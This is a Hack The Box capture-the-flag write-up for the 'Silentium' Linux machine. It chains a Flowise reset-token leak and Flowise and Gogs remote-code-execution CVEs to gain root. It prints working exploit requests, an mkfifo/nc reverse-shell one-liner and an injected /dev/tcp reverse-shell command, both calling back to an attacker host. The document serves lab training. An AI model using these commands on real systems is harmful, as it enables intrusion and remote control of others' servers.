# Silentium

#HTB #Linux #Easy

| Field      | Value          |
|------------|----------------|
| **IP**     | `10.129.63.247`       |
| **OS**     | Linux         |
| **Difficulty** | Easy |
| **Date**   | 2026-05-07       |
| **Status** | Rooted         |

---

## Enumeration

### Ports & Services

| Port | Proto | Service | Version | Notes |
|------|-------|---------|---------|-------|
| 22    | tcp   | ssh     | OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 |       |
| 80    | tcp   | http    | nginx 1.24.0 |       |

### Web / Vhosts / Other

* http://silentium.htb/assets/app.js
* http://silentium.htb/assets/styles.css

* http://staging.silentium.htb/login
* http://staging.silentium.htb/signin

### Usernames / Targets

| Username | Source | Valid? | Password |
|----------|--------|--------|----------|
| ben@silentium.htb | Team page (no last name) + username enum | YES -- different error msg | |
| marcus.thorne@silentium.htb | Team page - Managing Director | NO | |
| elena.rossi@silentium.htb | Team page - Chief Risk Officer | NO | |

---

## Foothold

**Vuln / Attack Path:** Flowise 3.0.4 password reset token leak -> account takeover -> CVE-2025-59528 RCE -> Docker container -> SSH to host -> CVE-2025-8110 Gogs RCE as root

**Vulns identified:**
- CVE-2025-58434: Flowise forgot-password API leaks tempToken in response body (no email required)
- CVE-2025-59528: Flowise < 3.0.5 RCE via JS injection in customMCP node

**Steps:**
1. Forgot password API (`POST /api/v1/account/forgot-password`) leaked tempToken directly in response
2. Used tempToken to reset ben's password via `POST /api/v1/account/reset-password`
3. Logged in as ben@silentium.htb, extracted JWT cookie + API key from `/api/v1/apikey`
4. CVE-2025-59528: POST `/api/v1/node-load-method/customMCP` with JS payload in mcpServerConfig executes arbitrary commands
5. No bash on box -- used mkfifo + sh + nc for reverse shell

**Commands that worked:**
```bash
# Password reset token leak
curl -s -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" -H "x-request-from: internal" \
  -d '{"user":{"email":"ben@silentium.htb"}}'

# RCE reverse shell (no bash on box, use sh)
python3 flowise_rce.py -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <LHOST> 9001 >/tmp/f'
```

**Shell obtained:**
- **User:** root
- **Type:** sh
- **Method:** nc mkfifo via Flowise CVE-2025-59528 RCE

---

## Post-Exploitation

### User Flag
```
[FLAG REDACTED]
```

### Local Enumeration Findings
- `sudo -l`: not permitted for ben
- SUID: nothing useful
- `netstat -tlnp`: Gogs on localhost:3001, Mailhog on localhost:8025, Flowise container on localhost:3000
- `/etc/passwd`: only root and ben -- no other users
- Gogs running as root (`RUN_USER = root` in app.ini), open registration enabled

---

## Privilege Escalation

**Method:** CVE-2025-8110 -- Gogs authenticated RCE via symlink + sshCommand injection (Gogs running as root on localhost:3001)

**Steps:**
1. Registered a Gogs account (`test:ranger01`) on localhost:3001 (open registration enabled)
2. Created a repo, pushed a symlink `malicious_link -> .git/config` to it
3. Overwrote symlink via Gogs API (`PUT /api/v1/repos/{user}/{repo}/contents/malicious_link`) -- symlink traversal lets us write arbitrary content to server-side `.git/config`
4. Injected `sshCommand = bash -c 'bash -i >& /dev/tcp/LHOST/9001 0>&1'` into the config
5. Gogs triggered the sshCommand on the next git SSH operation -- shell landed as root

**Commands that worked:**
```bash
# Listener
nc -lvnp 9001

# Exploit (from host as ben via SSH tunnel or localhost)
python3 CVE-2025-8110-RCE.py -u http://localhost:3001 -user test -pass ranger01 -lh 10.10.17.22 -lp 9001
```

---

## Root Flag
```
[FLAG REDACTED]
```

---

## Loot

| Type   | Value | Source / Location |
|--------|-------|-------------------|
| Cred   | [REDACTED] | staging.silentium.htb login |
| Hash   | [REDACTED] | forgot-password response (ben) |
| API Key | [REDACTED] | /api/v1/apikey (DefaultKey) |
| Encryption Key | [REDACTED] | /root/.flowise/encryption.key |
| Cred | [REDACTED] | env FLOWISE_PASSWORD (container) |
| Cred | [REDACTED] | env SMTP_PASSWORD -- SSH to host (10.129.63.247) |
| Secret | [REDACTED] | JWT_AUTH_TOKEN_SECRET (container env) |
| Cred | [REDACTED] | env -- mailhog internal mail server |
| API Secret | [REDACTED] | /api/v1/apikey |

---

## Key Commands Reference

```bash
# Leak Flowise password reset token (no email needed)
curl -s -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" -H "x-request-from: internal" \
  -d '{"user":{"email":"ben@silentium.htb"}}'

# Flowise RCE (mkfifo shell, no bash on box)
python3 flowise_rce.py -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc LHOST 9001 >/tmp/f'

# Gogs CVE-2025-8110 RCE as root
python3 CVE-2025-8110-RCE.py -u http://localhost:3001 -user test -pass ranger01 -lh LHOST -lp 9001
```

---

## Lessons Learned

**CPTS methodology reinforced:**
- Reverse proxy usage -- vhost enumeration, adapting ffuf when soft 404s return 200 on everything (`-ac` autocalibration)
- API enumeration matters as much as web UI -- the token leak was purely in the API response, invisible in the browser
- Username enumeration via differential error messages
- Always check internal ports (`netstat -tlnp`) after landing -- services on localhost can be the entire privesc path
- Check what user internal services run as before picking an exploit (`ps aux`, app config files)
- RCE on a web app doesn't mean RCE on the host -- assume container until proven otherwise (check `/etc/hosts`, mount points, hostname)

**What to do differently next time:**
- Don't fixate on a single exploit -- CVE-2024-39930 (Gogs SSH arg injection) was dead due to sshd config, spent too long on it before pivoting
- Look for more than one CVE per service, not just the top ExploitDB hit -- search GitHub, NVD, blog posts
- Give a public exploit ~10 minutes of real testing; if it's not moving, find the next angle
- Public PoCs almost always have bugs (hardcoded creds, wrong arg names, mixed indentation) -- read the code before running it

<!-- Made with ❤️ from your friendly hacker - er2oneousbit -->
